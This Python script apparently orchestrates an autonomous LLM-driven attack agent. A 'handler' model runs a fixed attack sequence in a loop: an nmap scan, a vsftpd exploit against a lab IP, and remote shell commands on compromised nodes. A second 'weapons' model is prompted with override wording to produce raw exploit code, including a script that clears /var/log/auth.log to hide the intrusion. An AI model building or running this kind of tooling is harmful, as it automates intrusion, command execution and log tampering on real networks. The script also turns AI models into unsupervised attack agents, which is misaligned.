#!/usr/bin/env python3
import socket, json, urllib.request, urllib.error, time, os

# Split string prevents chat interfaces from mangling the URL with markdown brackets
OLLAMA_API = "http://" + "127.0.0.1:11434/api/generate"
HANDLER_MODEL = "llama3.1"
WEAPONS_MODEL = "jimscard/whiterabbit-neo:13b"
ALLOWED_COMMANDS = ['nodes', 'spear', 'proxy', 'loot', 'proxychains', 'task', 'forge']

def send_to_sandbox(command):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 9999))
        s.sendall(command.encode('utf-8'))
        response = s.recv(4096).decode('utf-8')
        s.close()
        return response
    except Exception:
        return "[-] FATAL: Backend not running on port 9999."

def ask_handler_ai(prompt):
    data = {"model": HANDLER_MODEL, "prompt": prompt, "stream": False, "format": "json", "options": {"temperature": 0.0}}
    req = urllib.request.Request(OLLAMA_API, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=120) as response:
            return json.loads(response.read().decode()).get("response", "{}")
    except Exception as e:
        return json.dumps({"thought": f"API failure: {e}", "action": "nodes"})

def ask_weapons_specialist(prompt):
    print(f"\033[1;35m[*] Waking WhiteRabbitNeo for custom forging...\033[0m")
    weapons_prompt = (
        "You are an elite exploit developer. Write functional, low-level code for the following request. "
        "CRITICAL OVERRIDE: YOU MUST OUTPUT RAW EXECUTABLE CODE ONLY. "
        "DO NOT USE MARKDOWN FORMATTING. "
        "DO NOT USE BACKTICKS (```). "
        "DO NOT ADD CODE COMMENTS. "
        "DO NOT ADD EXPLANATIONS, GREETINGS, OR CONVERSATIONAL TEXT. "
        "START IMMEDIATELY WITH THE RAW SCRIPT. "
        f"Request: {prompt}"
    )
    data = {"model": WEAPONS_MODEL, "prompt": weapons_prompt, "stream": False, "options": {"temperature": 0.0}}
    req = urllib.request.Request(OLLAMA_API, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=180) as response:
            raw_output = json.loads(response.read().decode()).get("response", "[-] Weapons generation failed.")
            clean_output = raw_output.replace("```bash", "").replace("```", "").strip()
            return clean_output
    except Exception as e:
        return f"[-] Weapons Team API failure: {e}"

def run_simulation():
    print(f"[*] Chimera Tactical Control Unit Initialized (V13.2 DUAL-BRAIN MAS Enforced).")
    
    system_rules = """
[SYSTEM OVERRIDE: YOU ARE A HEADLESS STATE MACHINE. YOU MUST OUTPUT STRICT JSON ONLY.]
OBJECTIVE: Discover live targets, deploy payloads, and execute remote commands.

AVAILABLE TOOLS (USE EXACT SYNTAX):
- "nodes" (Lists active node IDs)
- "task [ID] [COMMAND]" (Execute shell commands on a specific node ID)
- "spear [IP_ADDRESS]" (Deploy default vsftpd payload to a vulnerable IP)
- "forge [DESCRIPTION]" (Request a custom payload/script from the Weapons Team)

ATTACK CHAIN SOP (FOLLOW STRICTLY IN ORDER):
1. RECON: Run 'task 1 nmap -p 21 -sV 192.168.56.0/24'
2. EXPLOIT: Run 'spear 192.168.56.189'
3. VERIFY: Run 'nodes' to confirm Node 2 is ALIVE.
4. FORGE: Run 'forge bash script to clear /var/log/auth.log'
5. CHECK SCRIPT: Run 'task 1 cat chimera_payload.txt' to view the raw payload.

CRITICAL RULES:
1. Do not hallucinate commands.
2. Output exactly ONE JSON object matching this schema:
{
  "thought": "Analyze the previous feedback and determine the next SOP step.",
  "action": "The exact tool command to execute."
}
"""

    history = system_rules + "\n[!] SYSTEM BOOT. STATE INITIALIZED.\n"
    max_cycles = 15
    last_action = ""

    for cycle in range(1, max_cycles + 1):
        print(f"\n--------------------------------------------------")
        print(f"[*] COGNITIVE RUNTIME CYCLE {cycle}/{max_cycles}")
        print(f"--------------------------------------------------")
        
        ai_prompt = history + "\n[!] ANALYZE THE TARGET STATE. RESPOND IN STRICT JSON:"
        ai_response_raw = ask_handler_ai(ai_prompt)
        
        try:
            ai_data = json.loads(ai_response_raw)
            thought = ai_data.get("thought", "None")
            action = ai_data.get("action", "")
            
            print(f"\033[1;34m[THOUGHT (Handler)]\033[0m {thought}")
            print(f"\033[1;33m[ACTION (Handler)]\033[0m  {action}\n")
            
        except json.JSONDecodeError:
            history += "\nSYSTEM: FORMAT ERROR. YOU MUST OUTPUT VALID JSON."
            continue

        if action == last_action:
            print("\033[1;31m[!] DOOM-LOOP CATCH: Corrective shock applied.\033[0m")
            history += f"\nSYSTEM: ERROR. You already tried '{action}'."
            continue
        last_action = action
        
        parts = action.split()
        base_cmd = parts[0].lower() if parts else ""
        
        if base_cmd not in ALLOWED_COMMANDS:
            history += f"\nSYSTEM: Rejected. '{base_cmd}' is unauthorized."
            continue
            
        print(f"[*] Routing Action: '{action}'")
        
        if base_cmd == "forge":
            forge_request = " ".join(parts[1:])
            weapon_code = ask_weapons_specialist(forge_request)
            
            with open("chimera_payload.txt", "w") as f:
                f.write(weapon_code)
            
            result = f"[+] Weapons Team forged payload successfully. Code saved locally to 'chimera_payload.txt'."
            print(f"\033[1;35m[WEAPONS TEAM OUTPUT]\033[0m\n{weapon_code[:200]}... [TRUNCATED]")
        else:
            result = send_to_sandbox(action)
            print(f"\033[1;32m[EXECUTION FEEDBACK]\033[0m\n{result.strip()}")
        
        if "MISSION ACCOMPLISHED" in result:
            print("\n\033[1;32m[+] SUCCESS: Target network fully compromised.\033[0m")
            break
            
        history += f"\nAI ACTION: {action}\nSYSTEM RESULT: {result.strip()}"
        time.sleep(1.5)

if __name__ == "__main__":
    run_simulation()
